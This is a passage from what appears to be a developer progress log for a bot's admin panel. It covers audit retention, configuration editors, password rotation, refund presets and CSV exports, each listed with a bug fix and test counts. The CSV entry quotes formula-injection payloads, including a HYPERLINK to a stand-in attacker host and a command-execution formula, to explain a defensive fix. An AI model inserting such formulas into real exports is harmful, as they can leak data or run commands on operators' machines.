    in `main.py`. Env vars `MEMORY_CONTEXT_LIMIT` /
    `MEMORY_CONTENT_MAX_CHARS` documented in `.env.example`. Bundled
    bug fix: `get_full_conversation` now includes `image_data_uris` —
    vision turns surface a `[image]` marker in the `.txt` export
    instead of being silently dropped. 72 new tests in
    `tests/test_memory_config.py`. Total suite: 3144 passing.
27. **Stage-15-Step-E #10b row 20 SHIPPED** — Audit retention policy.
    New `audit_retention.py` module (DB-backed override for
    `AUDIT_RETENTION_DAYS`, default 90, range [7, 3650]) + background
    reaper loop that batch-deletes `admin_audit_log` rows older than
    the retention window. Retention editor card (collapsible) on
    `/admin/audit` with breakdown table + set/clear form, audit slug
    `audit_retention_update`. Boot warm-up in `main.py`. Env vars
    documented in `.env.example`. Bundled bug fix:
    `list_admin_audit_log` now caps `limit` to 10 000 — previously
    unbounded. 50 new tests. Total suite: 3122 passing.
28. **Stage-15-Step-E #10b row 23 OPENED** — DISCOVERY_INTERVAL_SECONDS
    editor on `/admin/models-config`. New `model_discovery_config.py`
    module (DB-backed override, range [60, 604800]). Discovery loop
    re-reads interval from DB every tick. Sidebar link ⚙️ Models config.
    Audit slug `models_config_discovery_interval_update`. Bundled bug fix:
    `delete_setting` now strips NUL bytes, mirroring `upsert_setting`.
    47 new tests. Total suite: 3119 passing.
29. **Stage-15-Step-E #10b row 24 OPENED** — FX_REFRESH_INTERVAL_SECONDS
    editor on `/admin/wallet-config`. New `fx_refresh_config.py` module
    (DB-backed override, range [60, 86400] — 1 minute to 1 day). FX
    refresher loop re-reads interval every tick so a saved override is
    live without a redeploy. Editor card on `/admin/wallet-config` with
    breakdown (effective / db / env / default) and set/clear form. Audit
    slug `wallet_config_fx_refresh_update`. Bundled bug fix: new
    `fx_rates._sync_registered_cadence` helper pushes the resolved
    cadence into `bot_health.LOOP_CADENCES` at loop start and after every
    tick; pre-fix, an operator who set `FX_REFRESH_INTERVAL_SECONDS` to
    anything other than the 600 s compile-time default saw the
    `/admin/control` panel continuously flag `fx_refresh` as overdue
    because the panel's stale-threshold formula `2 × cadence + 60` used
    the registered 600 s rather than the resolved value. Mirrors the
    row-21 bot-health-alert fix. 95 new tests. Total suite: 3336 passing.
30. **Stage-15-Step-E #10b row 25 OPENED** — ADMIN_PASSWORD rotation form
    on `/admin/profile`. New `admin_password.py` module: scrypt-hashed
    (n=2^15, r=8, p=1) password stored in
    `system_settings.ADMIN_PASSWORD_HASH`, DB-backed override mirroring
    rows 4/6/8/20/21/23/24. Login flow prefers DB hash → env back-compat
    → "deploy is misconfigured" refusal. New `/admin/profile` page
    (sidebar link 👤 Profile) with current-credential provenance
    breakdown + rotation form (current + new + confirm), gated to
    `ROLE_SUPER`. Strength gate: ≥12 chars, letter + digit/symbol,
    refuses whitespace-only / unchanged / current-equals-new. Boot
    warm-up in `main.py`. Audit slugs `profile_view`,
    `admin_password_rotated`, `admin_password_rotation_failed`.
    Bundled bug fix: `/admin/logout` now sweeps `meow_admin_view_as`
    + `meow_flash` cookies in addition to the session cookie —
    previously a shared workstation leaked the prior operator's
    "viewing as <role>" preview into the next person's session. 116
    new tests. Total suite: 3356 passing.
31. **Stage-15-Step-E #10b row 17 SHIPPED** — Stats bucketing
    (weekly/monthly) on new `/admin/users/{id}/stats` page.
    `Database.get_user_daily_spending` gained a `bucket` parameter
    (`day` / `week` / `month`) that controls `date_trunc` granularity.
    New `user_stats_get` handler + `user_stats.html` template with
    bucket-selector buttons (auto-widens the date window: 30d for
    daily, 90d for weekly, 365d for monthly), aggregate tiles (bucket
    count, total calls, total cost), and a spending-series table with
    inline CSS bar chart.  Link from user-detail page ("Spending stats →").
    Bundled bug fix: `Database.get_user_admin_summary` used
    `float(credited or 0)` which silently passed `Decimal('NaN')`
    through because NaN is truthy in Python — the admin user-detail
    page would render `$nan` for "Lifetime credited / spent" on any
    user whose transaction history includes a pre-PR-#75 NaN
    `amount_usd_credited` row.  Now scrubbed through
    `_is_finite_amount` the same way `get_user_spending_summary`
    already does.  22 new tests.  Total suite: 3565 passing.
32. **Stage-15-Step-E #10b row 28 SHIPPED — PR #187** — Refund presets.
    New `refund_presets.py` module: DB-backed override of the operator-
    curated refund-reason list, parsed via newline + pipe separator,
    case-insensitive dedupe, ≤5 entries × ≤40 chars each, JSON-encoded
    into `system_settings.REFUND_PRESETS` (worst-case 216 chars fits
    the 255-char column with headroom). New `/admin/refund-presets`
    editor page with sidebar link (↩️ Refund presets) and the standard
    effective / db / env / default breakdown. The transactions
    refund form now renders a `<select name="reason_preset">` above
    the free-text reason — picking a preset seeds the textarea via
    inline JS so the operator can still edit before submitting; an
    empty-list override hides the dropdown for backwards-compat.
    Boot warm-up in `main.py` (refresh_refund_presets_override_from_db).
    Audit slug `refund_presets_update` carries before/after lists +
    sources for full forensics. Bundled bug fix: new
    `_scrub_audit_meta` in `database.py` makes `record_admin_audit`
    AND `record_payment_status_transition` lossless across `Decimal`
    (every money-handling caller produces these from asyncpg numeric
    reads), `datetime` / `date` / `time` / `timedelta` (every "X
    happened at" meta field), and non-finite `float` (NaN / ±Infinity
    from a corrupted balance). Pre-fix, any of those silently
    crashed `json.dumps`, the bare `except` swallowed the row, and
    the audit feed forgot the event ever happened — exactly the
    wrong shape for an audit log whose entire job is "do not lose
    anything". Walks dicts + lists recursively; tuples / sets → list;
    bytes → utf-8 decoded; non-finite floats → JSON null; unknown
    types → tagged `<unscrubbable:Type:repr>` string for grep-ability.
    Belt-and-suspenders: serialiser now uses `allow_nan=False` so
    a future scrub miss raises loudly instead of emitting non-standard
    `NaN` / `Infinity` literals that Postgres' `::jsonb` cast then
    silently rejects. 44 new tests (29 refund_presets + 6 audit-meta
    scrub + 9 web-admin integration). Total suite: 3609 passing.
33. **Stage-15-Step-E #10b row 26 SHIPPED — PR #186** — `ADMIN_2FA_ENROLLMENT_TIMEOUT`
    DB-backed override + editor card on `/admin/enroll_2fa` with breakdown
    table, set / clear form, source badge. Suggested-secret mode shows a
    JavaScript countdown that auto-reloads when the window expires.
    Default 300 s (5 min), range [30, 3600]. Boot warm-up in `main.py`.
    Audit slug `enroll_2fa_timeout_update`. Env var in `.env.example`.
    Bundled bug fix: `memory_config_get` called the undefined
    `get_flash(request)` instead of `pop_flash(request, response)` —
    saving a memory-config override would 500 with `NameError`. 76 new
    tests. Total suite: 3624 passing.
34. **Stage-15-Step-E #10b row 27 SHIPPED — PR #188** — CSV bulk export hub.
    New `/admin/exports` page (sidebar link 📦 Bulk exports) collects every
    CSV download in one place: existing transactions / monetization
    exporters PLUS two new system-wide streaming endpoints
    (`/admin/exports/usage.csv` and `/admin/exports/audit.csv`). Each new
    endpoint streams via a keyset-paginated async generator
    (`Database.iter_system_usage_logs` / `Database.iter_admin_audit_log`)
    in batches of 5 000 rows so a multi-MB pull doesn't pin a DB pool slot
    for the whole download — every batch hands the connection back to the
    pool before yielding to the network. Hard caps: 1 M usage rows /
    100 k audit rows per export (operators who need more should narrow the
    window with `since` / `until` filters; the inline form on the hub page
    exposes them as `<input type="datetime-local">`). New
    `Database.get_export_table_counts` returns lightweight
    `COUNT(*)` for all three tables so the hub page renders accurate
    "rows in DB" counts. Audit slugs `system_usage_export_csv` and
    `admin_audit_export_csv` are pinned in `AUDIT_ACTION_LABELS` so they
    surface in the action dropdown on `/admin/audit`. Bundled bug fix:
    CSV / formula-injection defang (CWE-1236) latent since Stage-9
    transactions CSV (Sept 2025) and Stage-15 monetization CSV. Excel,
    LibreOffice Calc, Apple Numbers, and Google Sheets all evaluate any
    cell whose first character is `=`, `+`, `@`, `\t`, or `\r` as a
    formula, so a refund-reason of
    `=HYPERLINK("https://attacker.example", "click me")` (or the more
    sinister `+cmd|'/c calc'!A1`) turned every admin CSV download into a
    drive-by exfil / RCE primitive the moment the operator double-clicked
    the file. `_csv_quote` now prepends a `\t` to every field whose first
    character matches the sentinel set; the TAB is stripped on display
    by every spreadsheet tested but defeats formula-mode parsing because
    `\t=…` is text-with-leading-whitespace, not a formula. Negatives
    (`-`) are intentionally NOT defanged because every legitimate
    accounting CSV emits negative dollar amounts (refund debits,
    negative net profit, etc.) and false-flagging them would mangle
    every quarterly close — the residual narrow `-cmd|…` attack
    surface is documented inline in the
    `_CSV_FORMULA_INJECTION_SENTINELS` comment block and matches the
    trade-off Microsoft's own Power BI / Excel-export stack makes. The
    fix flows through the existing transactions / monetization CSVs
    too, not just the new endpoints. 31 new tests (20 web + 11 db).
    Total suite: 3716 passing.
35. **Working rule:** push PRs sequentially, bundle a real bug fix in each,
    update this doc + README in each, do NOT block on user approval. The
    user merges them when they wake up.
36. **Read the §11 working agreement before doing anything.**
